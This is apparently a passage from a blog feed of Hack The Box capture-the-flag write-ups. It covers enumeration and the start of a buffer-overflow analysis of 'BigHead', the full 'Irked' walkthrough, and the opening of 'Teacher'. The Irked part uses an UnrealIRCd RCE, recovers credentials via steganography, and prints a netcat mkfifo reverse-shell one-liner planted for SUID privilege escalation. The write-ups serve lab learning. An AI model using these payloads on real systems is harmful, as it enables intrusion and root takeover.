[+] Timeout : 2m0s ===================================================== 2019/04/24 20:16:23 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /assets (Status: 301) /backend (Status: 302) /Images (Status: 301) /images (Status: 301) /index.html (Status: 200) I went to /assets and it was forbidden : /backend redirected the browser to bighead.htb/BigHead which gave the same error we saw before : I clicked on error log and it gave the same error : Let’s check if there are any other subdomains. I used wfuzz with subdomains-top1mil-5000.txt from seclists: wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 non-valid subdomain responses are 11232 chars so we will remove those from the output : wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 We got 3 subdomains : dev, mailer and code. We already know about mailer, let’s add dev and code : code.bighead.htb redirected the browser to 127.0.0.1:5080/testlink/login.php So to see what’s on code.bighead.htb we will probably need to forward an internal service to our box. We can’t do that now so we will ignore code.bighead.htb for now. dev.bighead.htb shows this image of bighead : Source has nothing interesting : I ran gobuster again and got some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://dev.bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:55:05 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /blog (Status: 302) /blog_ajax (Status: 302) /blog_inlinemod (Status: 302) /blog_usercp (Status: 302) /blog_search (Status: 302) /blog_report (Status: 302) /blogger (Status: 302) /blogindex (Status: 302) /bloggers (Status: 302) /blogs (Status: 302) /blogspot (Status: 302) /wp-content (Status: 302) But all these pages gave this result : I intercepted the request in burp to figure out why : The response is 302, by following the redirect : It responds with another 302 So it will keep redirecting us in a loop and we won’t get anything. At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with wfuzz instead of gobuster and I got one more result : wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ The reason why gobuster didn’t show us this page is because of the status code. gobuster only showed results with these status codes : [+] Status codes : 200,204,301,302,307,403, While wfuzz showed everything except 404 responses, --hc 404. /coffee gave a response of 418 which is weird. I looked it up and found some info about it here. 418 I'm a teapot ! Anyway let’s take a look : http://dev.bighead.htb/coffee It’s showing this gif : Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?! I intercepted the request with burp and looked at the response : I noticed a weird server name : BigheadWebSvr 1.0. I looked it up and found a repository on the machine creator’s github (3mrgnc3) : I searched through the commits and got this one which seemed to be the right one. It asked for a password : I tried to guess it and after some attempts bighead worked : Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow. Buffer Overflow in BigheadWebSvr I tried to run the server but it complained about some missing dll called libmingwex-0.dll : So I installed mingw and copied the dll to the same directory as the server : Then I had to allow access for it : Now the server is running : But not on port 80 : I did netstat -a -b and found that it’s running on port 8008 : Great, I intercepted the request with burp then I ran the server again with Immunity Debugger : Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example R1ck that egg is doubled and added before the shellcode like this : R1ckR1ck + shellcode. It’s explained very well in skape’s paper Safely Searching Process Virtual Address Space. There are also many practical tutorials just search for win32 egghunting. Now back to the vulnerable server, first thing we need to know is the offset. I’m using mona plugin. Documentation !mona config -set workingfolder c:\logs\%p, to make mona output to C:\logs To find the offset we will create a pattern !mona pc 100 (creates a pattern of 100 chars), this is the same as pattern_create.rb from metasploit. I used it in my buffer overflow write-ups. It will put the output in a file called pattern.txt in C:\logs : Pattern : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Full output : ``` ================================================================================ Output generated by mona.py v2.0, rev 585 - Immunity Debugger Corelan Team - https://www.corelan.be ================================================================================ Process being debugged : BigheadWebSvr (pid 1300) Current mona arguments: pc 100 ================================================================================ 2019-04-24 22:43:44 ================================================================================</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/bighead/0.png" /></entry><entry><title type="html">Hack The Box - Irked</title><link href="http://localhost:4000/hack-the-box/irked/" rel="alternate" type="text/html" title="Hack The Box - Irked" /><published>2019-04-27T00:00:00+02:00</published><updated>2019-04-27T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/irked</id><content type="html" xml:base="http://localhost:4000/hack-the-box/irked/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-irked-retired-and-heres-my-write-up-about-it-it-was-an-easy-straightforward-machine-no-rabbit-holes-and-such-things-to-get-an-initial-shell-on-the-box-we-will-exploit-an-rce-vulnerable-irc-server-called-unrealircd-after-getting-a-shell-we-will-find-a-backup-file-which-has-a-password-we-will-use-that-password-to-get-a-hidden-text-file-from-an-image-steg-that-text-file-contains-another-password-which-we-will-use-to-get-ssh-access-as-another-user-finally-for-privilege-escalation-there-is-an-suid-binary-that-executes-a-file-and-we-control-that-file-so-we-can-get-a-reverse-shell-as-root-its-a-linux-box-and-its-ip-is-101010117-i-added-it-to-etchosts-as-irkedhtb-lets-jump-right-in-&quot;&gt;Hey guys, today Irked retired and here’s my write-up about it. It was an easy straightforward machine, no rabbit holes and such things. To get an initial shell on the box we will exploit an RCE vulnerable irc server called &lt;code class=&quot;highlighter-rouge&quot;&gt;UnrealIRCd&lt;/code&gt;. After getting a shell we will find a backup file which has a password. We will use that password to get a hidden text file from an image (steg). That text file contains another password which we will use to get ssh access as another user. Finally for privilege escalation there is an &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binary that executes a file, and we control that file so we can get a reverse shell as root. It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.117&lt;/code&gt;. I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;irked.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC irked.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/irked/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-is-ssh-running-on-port-22-and-http-running-on-port-80-lets-take-a-look-at-http&quot;&gt;There is ssh running on port 22 and http running on port 80. Let’s take a look at http.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-is-only-that-image-and-a-message-saying--irc-is-almost-working-source-also-has-nothing-interesting-&quot;&gt;There is only that image and a message saying : &lt;code class=&quot;highlighter-rouge&quot;&gt;IRC is almost working!&lt;/code&gt;, Source also has nothing interesting :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-a-hint-which-is-irc-lets-check-that-if-we-didnt-find-anything-then-we-will-continue-with-http&quot;&gt;We have a hint which is irc, let’s check that. If we didn’t find anything then we will continue with http.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;irc&quot;&gt;IRC&lt;/h3&gt;
&lt;h4 id=&quot;i-searched-for-irc-and-found-here-that-if-there-is-an-irc-server-running-on-the-machine-then-probably-it-will-be-in-the-port-range-from-6000-to-7000-so-i-ran-another-nmap-scan-&quot;&gt;I searched for irc and found &lt;a href=&quot;https://en.wikipedia.org/wiki/Internet_Relay_Chat#Technical_information&quot;&gt;here&lt;/a&gt; That if there is an irc server running on the machine, then probably it will be in the port range from 6000 to 7000. So I ran another nmap scan :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 6000-7000 -sV -sT -sC irked.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/irked/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-is-an-irc-server-running-on-port-6697-called-unrealircd-there-are-some-known-vulnerabilities-for-unrealircd-one-of-them-is-a-remote-code-execution-and-there-is-a-metasploit-module-for-it-&quot;&gt;There is an irc server running on port 6697 called &lt;code class=&quot;highlighter-rouge&quot;&gt;UnrealIRCd&lt;/code&gt;. There are some known vulnerabilities for &lt;code class=&quot;highlighter-rouge&quot;&gt;UnrealIRCd&lt;/code&gt;, One of them is a Remote Code Execution and there is a metasploit module for it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-check-if-the-server-is-vulnerable-to-it&quot;&gt;Let’s check if the server is vulnerable to it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/6.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/irked/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-and-we-got-a-shell-as-ircd-&quot;&gt;It worked and we got a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;ircd&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;steg-in-irkedjpg-ssh-as-djmardov&quot;&gt;Steg in &lt;code class=&quot;highlighter-rouge&quot;&gt;irked.jpg&lt;/code&gt;, SSH as &lt;code class=&quot;highlighter-rouge&quot;&gt;djmardov&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;there-are-two-users-on-the-box--ircd-and-djmardov-i-checked-homeircd-and-there-was-nothing-interesting-in-homedjmardov-i-didnt-find-usertxt-&quot;&gt;There are two users on the box : &lt;code class=&quot;highlighter-rouge&quot;&gt;ircd&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;djmardov&lt;/code&gt;. I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/ircd&lt;/code&gt; and there was nothing interesting. In &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/djmardov&lt;/code&gt; I didn’t find &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-to-go-into-ssh-but-i-got-permission-denied-&quot;&gt;I tried to go into &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; but I got &lt;code class=&quot;highlighter-rouge&quot;&gt;Permission denied&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-other-directories-like-desktop-downloads-documents-etc-and-in-documents-i-found-usertxt-and-a-file-called-backup-&quot;&gt;I checked other directories like &lt;code class=&quot;highlighter-rouge&quot;&gt;Desktop&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Downloads&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Documents&lt;/code&gt; etc… And in &lt;code class=&quot;highlighter-rouge&quot;&gt;Documents&lt;/code&gt; I found &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; and a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;.backup&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/11.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;cat .backup&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/irked/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-gives-us-a-hint-about-some-steg-backup-we-also-get-something-that-looks-like-a-password--upupdowndownlrlrbabassss-but-where-will-we-use-that-password--remember-the-image-we-saw-earlier-on-that-apache-server-&quot;&gt;It gives us a hint about some steg backup, we also get something that looks like a password : &lt;code class=&quot;highlighter-rouge&quot;&gt;UPupDOWNdownLRlrBAbaSSss&lt;/code&gt;. But where will we use that password ? Remember the image we saw earlier on that apache server ?&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/2.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/irked/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-downloaded-it-then-used-steghide-to-check-if-there-is-any-hidden-file&quot;&gt;I downloaded it then used &lt;code class=&quot;highlighter-rouge&quot;&gt;steghide&lt;/code&gt; to check if there is any hidden file.&lt;/h4&gt;
&lt;h4 id=&quot;note--i-have-a-list-for-some-steganography-tools-if-you-are-not-familiar-with-steg-you-can-check-it-here&quot;&gt;Note : I have a list for some steganography tools, If you are not familiar with steg you can check it &lt;a href=&quot;/lists/stego&quot;&gt;here&lt;/a&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wget http://irked.htb/irked.jpg&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/irked/13.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;steghide info irked.jpg&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/irked/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-is-a-hidden-text-file-called-passtxt-lets-extract-it-&quot;&gt;There is a hidden text file called &lt;code class=&quot;highlighter-rouge&quot;&gt;pass.txt&lt;/code&gt;, Let’s extract it :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;steghide extract -sf irked.jpg&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/irked/15.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;cat pass.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/irked/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-the-password--kab6hmbbp2jhg-lets-try-to-login-as-djmardov-&quot;&gt;We got the password : &lt;code class=&quot;highlighter-rouge&quot;&gt;Kab6h+m+bbp2J:HG&lt;/code&gt;, let’s try to login as &lt;code class=&quot;highlighter-rouge&quot;&gt;djmardov&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exploiting-viewuser-privilege-escalation-to-root&quot;&gt;Exploiting &lt;code class=&quot;highlighter-rouge&quot;&gt;viewuser&lt;/code&gt;, Privilege Escalation to &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;after-some-enumeration-i-searched-for-suid-binaries-and-in-usrbin-i-found-a-binary-called-viewuser&quot;&gt;After some enumeration, I searched for &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binaries and in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; I found a binary called &lt;code class=&quot;highlighter-rouge&quot;&gt;viewuser&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find /usr/bin/ -perm -4000&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/irked/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-seems-interesting-so-i-decided-to-check-it&quot;&gt;It seems interesting so I decided to check it.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;viewuser&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/irked/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-shows-logged-in-users-but-we-dont-care-about-that-the-only-thing-we-care-about-is-the-last-line--tmplistusers-1-tmplistusers-djmardov-not-found-it-seems-like-it-was-trying-to-do-something-with-the-file-tmplistusers-which-doesnt-exist-i-downloaded-viewuser-to-try-some-stuff-&quot;&gt;It shows logged in users, but we don’t care about that. The only thing we care about is the last line : &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/listusers: 1: /tmp/listusers: djmardov: not found&lt;/code&gt;. It seems like it was trying to do something with the file &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/listusers&lt;/code&gt; which doesn’t exist. I downloaded &lt;code class=&quot;highlighter-rouge&quot;&gt;viewuser&lt;/code&gt; to try some stuff :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;scp djmardov@irked.htb:/usr/bin/viewuser ./&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/irked/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;when-i-did-ltrace-on-the-binary-i-found-that-it-executes-tmplistusers-&quot;&gt;When I did &lt;code class=&quot;highlighter-rouge&quot;&gt;ltrace&lt;/code&gt; on the binary I found that it executes &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/listusers&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-since-this-binary-runs-as-root-then-it-also-executes-tmplistusers-as-root-so-we-can-simply-get-a-reverse-shell-by-putting-the-payload-in-tmplistusers-then-after-running-the-binary-again-it-should-execute-the-payload&quot;&gt;And since this binary runs as root, then it also executes &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/listusers&lt;/code&gt; as root. So we can simply get a reverse shell by putting the payload in &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/listusers&lt;/code&gt;, Then after running the binary again it should execute the payload.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f&quot; &amp;gt; /tmp/listusers&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/irked/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;everything-is-fine-lets-check-our-listener-&quot;&gt;Everything is fine, let’s check our listener :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/23.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/irked/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-own-root-&quot;&gt;Now we own root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---teacher&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/teacher/&quot;&gt;Hack The Box - Teacher&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---bighead&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bighead/&quot;&gt;Hack The Box - BigHead&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Steganography" /><category term="Web" /><category term="ssh" /><category term="Reverse Engineering" /><category term="Binary Exploitation" /><summary type="html">Quick Summary Hey guys, today Irked retired and here’s my write-up about it. It was an easy straightforward machine, no rabbit holes and such things. To get an initial shell on the box we will exploit an RCE vulnerable irc server called UnrealIRCd. After getting a shell we will find a backup file which has a password. We will use that password to get a hidden text file from an image (steg). That text file contains another password which we will use to get ssh access as another user. Finally for privilege escalation there is an suid binary that executes a file, and we control that file so we can get a reverse shell as root. It’s a linux box and its ip is 10.10.10.117. I added it to /etc/hosts as irked.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC irked.htb There is ssh running on port 22 and http running on port 80. Let’s take a look at http. HTTP Initial Enumeration There is only that image and a message saying : IRC is almost working!, Source also has nothing interesting : We have a hint which is irc, let’s check that. If we didn’t find anything then we will continue with http. IRC I searched for irc and found here That if there is an irc server running on the machine, then probably it will be in the port range from 6000 to 7000. So I ran another nmap scan : nmap -p 6000-7000 -sV -sT -sC irked.htb There is an irc server running on port 6697 called UnrealIRCd. There are some known vulnerabilities for UnrealIRCd, One of them is a Remote Code Execution and there is a metasploit module for it : Let’s check if the server is vulnerable to it. It worked and we got a shell as ircd : Steg in irked.jpg, SSH as djmardov There are two users on the box : ircd and djmardov. I checked /home/ircd and there was nothing interesting. In /home/djmardov I didn’t find user.txt : I tried to go into .ssh but I got Permission denied : I checked other directories like Desktop, Downloads, Documents etc… And in Documents I found user.txt and a file called .backup : cat .backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss It gives us a hint about some steg backup, we also get something that looks like a password : UPupDOWNdownLRlrBAbaSSss. But where will we use that password ? Remember the image we saw earlier on that apache server ? I downloaded it then used steghide to check if there is any hidden file. Note : I have a list for some steganography tools, If you are not familiar with steg you can check it here. wget http://irked.htb/irked.jpg steghide info irked.jpg There is a hidden text file called pass.txt, Let’s extract it : steghide extract -sf irked.jpg cat pass.txt We got the password : Kab6h+m+bbp2J:HG, let’s try to login as djmardov : We owned user ! Exploiting viewuser, Privilege Escalation to root After some enumeration, I searched for suid binaries and in /usr/bin I found a binary called viewuser. find /usr/bin/ -perm -4000 It seems interesting so I decided to check it. viewuser It shows logged in users, but we don’t care about that. The only thing we care about is the last line : /tmp/listusers: 1: /tmp/listusers: djmardov: not found. It seems like it was trying to do something with the file /tmp/listusers which doesn’t exist. I downloaded viewuser to try some stuff : scp djmardov@irked.htb:/usr/bin/viewuser ./ When I did ltrace on the binary I found that it executes /tmp/listusers : And since this binary runs as root, then it also executes /tmp/listusers as root. So we can simply get a reverse shell by putting the payload in /tmp/listusers, Then after running the binary again it should execute the payload. echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f&quot; &amp;gt; /tmp/listusers Everything is fine, let’s check our listener : Now we own root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Teacher Next Hack The Box write-up : Hack The Box - BigHead</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/irked/0.png" /></entry><entry><title type="html">Hack The Box - Teacher</title><link href="http://localhost:4000/hack-the-box/teacher/" rel="alternate" type="text/html" title="Hack The Box - Teacher" /><published>2019-04-20T00:00:00+02:00</published><updated>2019-04-20T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/teacher</id><content type="html" xml:base="http://localhost:4000/hack-the-box/teacher/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys--today-teacher-retired-and-here-is-my-write-up-about-it-i-dont-have-too-much-to-say-about-this-box-it-was-an-easy-regular-machine--we-will-exploit-an-authenticated-remote-code-execution-in-a-vulnerable-version-of-a-web-application-called-moodle-to-get-an-initial-shell-on-the-box-and-for-privilege-escalation-we-will-find-a-directory-which-permissions-are-set-to-read--write-and-execute-by-anyone--and-from-there-we-can-create-a-symlink-to-root-or-anything-else-we-want-to-access-its-a-linux-box-and-its-ip-is-101010153-i-added-it-to-etchosts-as-teacherhtb-lets-jump-right-in-&quot;&gt;Hey guys , today Teacher retired and here is my write-up about it. I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; or anything else we want to access. It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.153&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;teacher.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC teacher.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/teacher/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-only-see-http-running-on-port-80-lets-see-whats-in-there&quot;&gt;We only see http running on port 80. Let’s see what’s in there.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-is-just-a-static-website-titled-blackhat-highschool--i-looked-into-other-pages-like-courses--students-etc-and-also-checked-their-source-code-and-on-gallery-&quot;&gt;There is just a static website titled &lt;code class=&quot;highlighter-rouge&quot;&gt;Blackhat highschool&lt;/code&gt; , I looked into other pages like &lt;code class=&quot;highlighter-rouge&quot;&gt;Courses&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;Students&lt;/code&gt; etc… And also checked their source code. And on &lt;code class=&quot;highlighter-rouge&quot;&gt;Gallery&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-found-this-line-in-the-source-&quot;&gt;I found this line in the source :&lt;/h4&gt;
